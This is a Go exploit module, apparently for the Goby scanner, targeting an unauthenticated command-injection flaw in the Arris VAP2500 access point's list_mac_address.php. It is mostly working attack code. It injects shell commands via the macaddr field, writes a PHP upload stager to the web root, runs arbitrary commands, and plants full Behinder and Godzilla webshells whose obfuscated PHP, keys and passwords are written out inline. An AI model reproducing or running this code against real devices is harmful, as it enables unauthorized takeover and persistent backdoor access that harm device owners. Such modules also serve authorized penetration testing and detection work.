package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net/url"
	"strconv"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Arris VAP2500 list_mac_address Unauthorized Remote Command Execution Vulnerability",
    "Description": "<p>Arris VAP2500 is a wireless access point product of Arris Group Corporation of the United States.</p><p>Attackers can use this vulnerability to arbitrarily execute code on the server side, write backdoors, obtain server permissions, and then control the entire web server.</p>",
    "Product": "ARRIS-Netopia-2000",
    "Homepage": "https://www.arris.com/",
    "DisclosureDate": "2023-08-10",
    "PostTime": "2023-08-11",
    "Author": "Gryffinbit@gmail.com",
    "FofaQuery": "body=\"./images/lg_05_1.gif\"",
    "GobyQuery": "body=\"./images/lg_05_1.gif\"",
    "Level": "3",
    "Impact": "<p>Attackers can use this vulnerability to arbitrarily execute code on the server side, write backdoors, obtain server permissions, and then control the entire web server.</p>",
    "Recommendation": "<p>1. There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update: <a href=\"https://www.arris.com/\">https://www.arris.com/</a></p><p>2. Set access policies and whitelist access through security devices such as firewalls.</p><p>3. If not necessary, prohibit public network access to the system.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "cmd,webshell",
            "show": ""
        },
        {
            "name": "cmd",
            "type": "input",
            "value": "id",
            "show": "attackType=cmd"
        },
        {
            "name": "webshell",
            "type": "select",
            "value": "godzilla,custom",
            "show": "attackType=webshell"
        },
        {
            "name": "filename",
            "type": "input",
            "value": "abc.php",
            "show": "webshell=custom"
        },
        {
            "name": "content",
            "type": "input",
            "value": "<?php @error_reporting(0);echo \"hello\";?>",
            "show": "webshell=custom"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Command Execution"
    ],
    "VulType": [
        "Command Execution"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.8",
    "Translation": {
        "CN": {
            "Name": "Arris VAP2500 list_mac_address 未授权远程命令执行漏洞",
            "Product": "ARRIS-Netopia-2000",
            "Description": "<p>Arris VAP2500是美国Arris集团公司的一款无线接入器产品。<br></p><p>攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个web服务器。<br></p>",
            "Recommendation": "<p>1、官方暂未修复该漏洞，请用户联系厂商修复漏洞：<a href=\"https://www.arris.com/\">https://www.arris.com/</a></p><p>2、通过防火墙等安全设备设置访问策略，设置白名单访问。</p><p>3、如非必要，禁止公网访问该系统。</p>",
            "Impact": "<p>攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个web服务器。<br></p>",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
                "命令执行"
            ]
        },
        "EN": {
            "Name": "Arris VAP2500 list_mac_address Unauthorized Remote Command Execution Vulnerability",
            "Product": "ARRIS-Netopia-2000",
            "Description": "<p>Arris VAP2500 is a wireless access point product of Arris Group Corporation of the United States.</p><p>Attackers can use this vulnerability to arbitrarily execute code on the server side, write backdoors, obtain server permissions, and then control the entire web server.</p>",
            "Recommendation": "<p>1. There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update:&nbsp;<a href=\"https://www.arris.com/\">https://www.arris.com/</a></p><p>2. Set access policies and whitelist access through security devices such as firewalls.</p><p>3. If not necessary, prohibit public network access to the system.</p>",
            "Impact": "<p>Attackers can use this vulnerability to arbitrarily execute code on the server side, write backdoors, obtain server permissions, and then control the entire web server.<br></p>",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
                "Command Execution"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10821"
}`

	sendPayloadFlagPds8 := func(hostInfo *httpclient.FixUrl, payload string) (*httpclient.HttpResponse, error) {
		payloadRequestConfig := httpclient.NewPostRequestConfig(`/list_mac_address.php`)
		payloadRequestConfig.VerifyTls = false
		payloadRequestConfig.FollowRedirect = false
		payloadRequestConfig.Header.Store("Content-Type", "application/x-www-form-urlencoded")
		payloadRequestConfig.Data = `macaddr=` + url.QueryEscape(`00:00:44:00:00:00;`+payload) + `&action=0&settype=1`
		return httpclient.DoHttpRequest(hostInfo, payloadRequestConfig)
	}

	checkFileFlagPds8 := func(hostInfo *httpclient.FixUrl, uri string) (*httpclient.HttpResponse, error) {
		if !strings.HasPrefix(uri, `/`) {
			uri = `/` + uri
		}
		checkRequestConfig := httpclient.NewGetRequestConfig(uri)
		checkRequestConfig.VerifyTls = false
		checkRequestConfig.FollowRedirect = false
		return httpclient.DoHttpRequest(hostInfo, checkRequestConfig)
	}
	uploadFileFlagPds8 := func(hostInfo *httpclient.FixUrl, filename, content string) (*httpclient.HttpResponse, error) {
		if !strings.HasSuffix(filename, ".php") {
			filename += ".php"
		}
		uploadRequestConfig := httpclient.NewPostRequestConfig(`/test.php`)
		uploadRequestConfig.VerifyTls = false
		uploadRequestConfig.FollowRedirect = false
		uploadRequestConfig.Header.Store("Content-Type", "application/x-www-form-urlencoded")
		uploadRequestConfig.Data = `filename=` + filename + `&content=` + url.QueryEscape(content)
		_, err := httpclient.DoHttpRequest(hostInfo, uploadRequestConfig)
		if err != nil {
			return nil, err
		}
		return checkFileFlagPds8(hostInfo, filename)
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(poc *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			checkStr := goutils.RandomHexString(16)
			_, err := sendPayloadFlagPds8(hostInfo, `echo '<?php @error_reporting(0);echo "`+checkStr+`";unlink(__FILE__);?>' > /var/www/1.php`)
			if err != nil {
				return false
			}
			rsp, err := checkFileFlagPds8(hostInfo, `1.php`)
			return rsp != nil && strings.Contains(rsp.Utf8Html, checkStr)
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			// 写入小马，基于小马上传其他木马
			attackType := goutils.B2S(ss.Params["attackType"])
			cmd := goutils.B2S(ss.Params["cmd"])
			webshell := goutils.B2S(ss.Params["webshell"])
			filename := goutils.B2S(ss.Params["filename"])
			content := goutils.B2S(ss.Params["content"])
			if attackType != "cmd" && attackType != "webshell" {
				expResult.Success = false
				expResult.Output = "未知的攻击方式"
				return expResult
			}
			_, err := sendPayloadFlagPds8(expResult.HostInfo, `echo '<?php file_put_contents($_POST["filename"], $_POST["content"])?>'> /var/www/test.php`)
			if err != nil {
				expResult.Success = false
				expResult.Output = err.Error()
				return expResult
			}
			rsp, err := checkFileFlagPds8(expResult.HostInfo, `/test.php`)
			if err != nil {
				expResult.Success = false
				expResult.Output = err.Error()
				return expResult
			}
			if rsp.StatusCode != 200 && rsp.StatusCode != 500 {
				expResult.Success = false
				expResult.Output = "漏洞利用失败"
				return expResult
			}
			if attackType == "cmd" {
				filename = goutils.RandomHexString(16) + ".php"
				rsp, err := uploadFileFlagPds8(expResult.HostInfo, filename, `<?php system(`+strconv.Quote(cmd)+`);unlink(__FILE__); ?>`)
				if err != nil {
					expResult.Success = false
					expResult.Output = err.Error()
					return expResult
				}
				if rsp.StatusCode == 200 || rsp.StatusCode == 500 {
					expResult.Success = true
					expResult.Output = rsp.Utf8Html
					return expResult
				}
			} else if attackType == "webshell" {
				if webshell == "behinder" {
					filename = goutils.RandomHexString(16) + ".php"
					content = `<?php @error_reporting(0);session_start();$key="e45e329feb5d925b";$_SESSION["k"]=$key;session_write_close();$post=file_get_contents("php://input");if(!extension_loaded("openssl")){$t="base64_"."decode";$post=$t($post."");for($i=0;$i<strlen($post);$i++){$post[$i]=$post[$i]^$key[$i+1&15];}}else{$post=openssl_decrypt($post,"AES128",$key);}$arr=explode("|",$post);$func=$arr[0];$params=$arr[1];class C{public function __invoke($p){eval($p."");}}@call_user_func(new C(),$params);?>`
				} else if webshell == "godzilla" {
					filename = goutils.RandomHexString(16) + ".php"
					content = `<?php @session_start(); @set_time_limit(0); @error_reporting(0); function encode($D,$K){ for($i=0;$i<strlen($D);$i++) { $c = $K[$i+1&15]; $D[$i] = $D[$i]^$c; } return $D; } $pass="pass"; $payloadName="payload"; $key="3c6e0b8a9c15224a"; if (isset($_POST[$pass])){ $data=encode(base64_decode($_POST[$pass]),$key); if (isset($_SESSION[$payloadName])){ $payload=encode($_SESSION[$payloadName],$key); if (strpos($payload,"getBasicsInfo")===false){ $payload=encode($payload,$key); } eval($payload); echo substr(md5($pass.$key),0,16); echo base64_encode(encode(@run($data),$key)); echo substr(md5($pass.$key),16); }else{ if (strpos($data,"getBasicsInfo")!==false){ $_SESSION[$payloadName]=encode($data,$key);}}}?>`
				}
				rsp, err = uploadFileFlagPds8(expResult.HostInfo, filename, content)
				if err != nil {
					expResult.Success = false
					expResult.Output = err.Error()
					return expResult
				}
				expResult.Success = true
				expResult.Output += "WebShell URL: " + expResult.HostInfo.FixedHostInfo + "/" + filename + "\n"
				if attackType != "custom" && webshell == "behinder" {
					expResult.Output += "Password: rebeyond\n"
					expResult.Output += "WebShell tool: Behinder v3.0\n"
				} else if attackType != "custom" && webshell == "godzilla" {
					expResult.Output += "Password: pass 加密器：PHP_XOR_BASE64\n"
					expResult.Output += "WebShell tool: Godzilla v4.1\n"
				}
				expResult.Output += "Webshell type: php"
				return expResult
			}
			return expResult
		},
	))
}
